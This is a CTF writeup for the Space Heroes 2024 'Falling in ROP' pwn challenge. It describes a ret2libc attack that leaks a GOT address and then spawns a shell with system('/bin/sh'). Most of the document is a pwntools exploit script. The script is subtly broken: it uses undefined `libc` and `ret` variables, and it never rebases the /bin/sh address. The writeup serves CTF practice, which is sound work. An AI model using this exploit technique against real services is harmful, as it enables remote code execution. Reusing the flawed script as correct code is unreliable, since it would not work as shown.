---
title: "Falling in ROP - Space Heroes 2024"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "pie", "checksec", "falling", "space-heroes", "space-heroes-2024", "2024", "ctf-writeup"]
summary: "In this writeup, I'll explain the process of exploiting the \"Space Heroes Falling in ROP\" challenge in the Pwn category."
source:
  name: "CTFtime writeup #39056"
  url: "https://ctftime.org/writeup/39056"
ctf:
  name: "Space Heroes 2024"
  year: 2024
  challenge: "Falling in ROP"
---

## Metadata

- **CTF:** Space Heroes 2024
- **Task:** Falling in ROP
- **Author team:** mimicats
- **CTFtime tags:** pwn, rop
- **CTFtime:** <https://ctftime.org/writeup/39056>

---
# Space Heroes Falling in ROP Writeup

## Introduction  
In this writeup, I'll explain the process of exploiting the "Space Heroes Falling in ROP" challenge in the Pwn category. The goal was to retrieve the flag by exploiting a vulnerability in the provided binary.

## Initial Analysis  
First, let's analyze the binary. We notice that there's no PIE (Position Independent Executable) protection, which means that addresses remain constant across different executions.

## Exploitation Strategy  
1\. **Leaking `printf` Address**: We'll use the `printf` function to leak addresses from the Global Offset Table (GOT). We'll overwrite the return address with the `main` function to loop back to the beginning of the program after the first payload.  
2\. **Finding libc Version**: With the leaked `printf` address, we can determine the libc version being used. We found the libc version to be `libc6_2.35-0ubuntu3.4_amd64`.  
3\. **Calculating `system` and `/bin/sh` Addresses**: Using the libc version, we find the addresses of the `system` function and the string `/bin/sh`.  
4\. **Launching Shell**: Finally, we construct the final payload to call `system("/bin/sh")`.

## Exploitation Code  
```python  
from pwn import *

p = remote("[spaceheroes-falling-in-rop.chals.io](http://spaceheroes-falling-in-rop.chals.io)", 443, ssl=True, sni="[spaceheroes-falling-in-rop.chals.io](http://spaceheroes-falling-in-rop.chals.io)")

context.binary = binary = './falling.bin'  
elf = ELF(binary, checksec=False)  
rop = ROP(elf)

pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

padding = b'A'*88

# Payload to leak printf address  
payload = padding + pop_rdi + p64(elf.got.printf) + p64(elf.plt.puts) + p64(elf.symbols.main)  
p.recvuntil(b"who you are: ")  
p.sendline(payload)

leaked_printf = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base address and system/bin/sh addresses  
libc_base = leaked_printf - libc.symbols['printf']  
system_addr = libc_base + libc.symbols['system']  
bin_sh_addr = next(libc.search(b'/bin/sh'))

# Payload to launch shell  
payload = padding + ret + pop_rdi + p64(bin_sh_addr) + p64(system_addr)  
p.recvuntil(b"who you are: ")  
p.sendline(payload)

p.interactive()
